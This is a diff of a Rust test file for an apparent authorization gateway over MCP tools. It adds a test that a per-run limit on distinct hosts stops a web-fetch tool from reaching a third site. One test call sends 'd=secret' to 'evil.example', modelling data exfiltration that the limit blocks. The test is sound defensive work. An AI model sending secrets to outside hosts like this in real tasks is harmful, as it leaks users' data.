@@ -50,8 +50,9 @@ impl Harness {
         let dir = tempfile::tempdir().unwrap();
         let policy_path = dir.path().join("policies.cedar");
         std::fs::write(&policy_path, POLICY).unwrap();
-        let upstream = FakeMcpServer::new(&["send_money", "get_balance", "flaky_pay"])
-            .with_failing_tool("flaky_pay");
+        let upstream =
+            FakeMcpServer::new(&["send_money", "get_balance", "flaky_pay", "get_webpage"])
+                .with_failing_tool("flaky_pay");
         let upstream_task = upstream.spawn().await.unwrap();
 
         let mut cfg = Config::default();
@@ -70,6 +71,10 @@ impl Harness {
                 ("send_money".to_string(), pay()),
                 ("flaky_pay".to_string(), pay()),
                 ("get_balance".to_string(), ToolAttrs::new().readonly(true)),
+                (
+                    "get_webpage".to_string(),
+                    ToolAttrs::new().with_input("url", ArgType::String),
+                ),
             ]),
         )]);
         cfg.audit.sqlite_path = dir.path().join("audit.db").to_string_lossy().into_owned();
@@ -346,7 +351,7 @@ async fn exchange_clamps_child_budget_to_parent_remaining() {
         .await
         .unwrap();
     assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
-    // A limit kind of a later phase (`distinct`) is refused, not ignored.
+    // A limit kind this version does not know is refused, not ignored.
     let resp = h
         .client
         .post(h.server.url("/token"))
@@ -357,7 +362,7 @@ async fn exchange_clamps_child_budget_to_parent_remaining() {
             "actor": "helper2",
             "authorization_details": [{"type": "attenuo_capabilities", "capabilities": [
                 {"server": "bank", "tool": "send_money",
-                 "limits": {"calls": 1, "distinct": {"arg": "recipient", "max": 1}}}
+                 "limits": {"calls": 1, "window": {"arg": "recipient", "max": 1}}}
             ]}],
             "client_id": "helper2",
             "client_secret": secret("helper2"),
@@ -590,4 +595,120 @@ async fn refund_is_admin_only_and_once_per_decision() {
         .unwrap()
         .iter()
         .any(|e| e["record"]["tool"] == "admin.budget.refund" && e["record"]["kind"] == "admin"));
+}
+
+/// `distinct` on a derived value (run-limits phase 2): at most two hosts across the run, any
+/// number of pages per host, charged to every hop; the denial names the derived argument; a
+/// URL without a host cannot be counted; a refund gives a host back; the lease tree shows
+/// each hop's limit and what is left.
+#[tokio::test]
+async fn distinct_hosts_bound_the_sites_a_run_can_reach() {
+    let h = Harness::start().await;
+    let root = h
+        .mint_root(json!([{"server": "bank", "tool": "get_webpage",
+            "limits": {"distinct": {"arg": "url", "derive": "host", "max": 2}}}]))
+        .await;
+    // The child asks for calls only; `calls: 5` does not imply two hosts, so it inherits the
+    // parent's `distinct`.
+    let child = h
+        .exchange(
+            &root.token,
+            "helper",
+            json!([{"server": "bank", "tool": "get_webpage", "limits": {"calls": 5}}]),
+        )
+        .await;
+    let chain = decode_chain(&child.token);
+    assert_eq!(
+        chain["chain"]["hops"][1]["capabilities"][0]["limits"],
+        json!({"calls": 5, "distinct": {"arg": "url", "max": 2, "derive": "host"}})
+    );
+    let fetch = |url: &'static str| {
+        let token = child.token.clone();
+        let h = &h;
+        async move { h.call(&token, "get_webpage", json!({ "url": url })).await }
+    };
+    assert!(allowed(&fetch("https://news.example/article").await));
+    assert!(allowed(&fetch("https://NEWS.example:443/other?q=1").await));
+    assert!(allowed(&fetch("https://docs.example/").await));
+    let (reason, limit) = denial(&fetch("https://evil.example/?d=secret").await);
+    assert_eq!(reason, "budget_exhausted");
+    assert_eq!(
+        limit,
+        json!({"hop": 0, "kind": "distinct", "arg": "url#host", "max": 2, "used": 2})
+    );
+    // A page of a site already reached still goes through.
+    assert!(allowed(&fetch("https://news.example/third").await));
+    // No host to count: refused before Cedar.
+    assert_eq!(
+        denial(&fetch("news.example/article").await).0,
+        "limit_arg_invalid"
+    );
+    // AuthZEN sees a known host as not new.
+    let v = h
+        .authzen(
+            &child.token,
+            "get_webpage",
+            json!({"url": "https://docs.example/x"}),
+        )
+        .await;
+    assert_eq!(v["decision"], true, "{v}");
+    assert_eq!(v["context"]["budget"]["destination_new"], false, "{v}");
+
+    // The record of the docs.example call charged both hops' counts.
+    let decisions = h.decisions().await;
+    let docs = decisions
+        .iter()
+        .filter(|d| d["decision"] == "allow")
+        .nth(2)
+        .unwrap();
+    let charged: Vec<&Value> = docs["budget"]["charged"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|c| c["kind"] == "distinct")
+        .collect();
+    assert_eq!(charged.len(), 2, "{docs}");
+    assert!(charged
+        .iter()
+        .all(|c| c["arg"] == "url#host" && c["used_after"] == 2));
+
+    // The lease tree shows both hops' limits and what is left.
+    let tree: Value = h
+        .client
+        .get(h.server.url(&format!("/admin/leases/{}/tree", root.lease)))
+        .bearer_auth(ADMIN)
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    let nodes = tree["nodes"].as_array().unwrap();
+    let budget_of =
+        |lease: &str| nodes.iter().find(|n| n["lease_id"] == lease).unwrap()["budget"].clone();
+    let root_budget = budget_of(&root.lease);
+    assert_eq!(root_budget["recorded"], true, "{root_budget}");
+    assert_eq!(
+        root_budget["limits"],
+        json!([{"cap": 0, "server": "bank", "tool": "get_webpage", "kind": "distinct",
+                "arg": "url#host", "max": 2, "used": 2, "remaining": 0}])
+    );
+    let child_budget = budget_of(&child.lease);
+    let kinds: Vec<(&str, u64)> = child_budget["limits"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|l| (l["kind"].as_str().unwrap(), l["used"].as_u64().unwrap()))
+        .collect();
+    assert_eq!(kinds, vec![("calls", 5), ("distinct", 2)], "{child_budget}");
+
+    // A refund of the docs.example decision gives the host back.
+    let resp = h
+        .admin_post(
+            "/admin/budgets/refund",
+            json!({"decision_id": docs["id"], "reason": "test"}),
+        )
+        .await;
+    assert_eq!(resp.status(), StatusCode::OK);
+    assert!(allowed(&fetch("https://evil.example/?d=fine-now").await));
 }
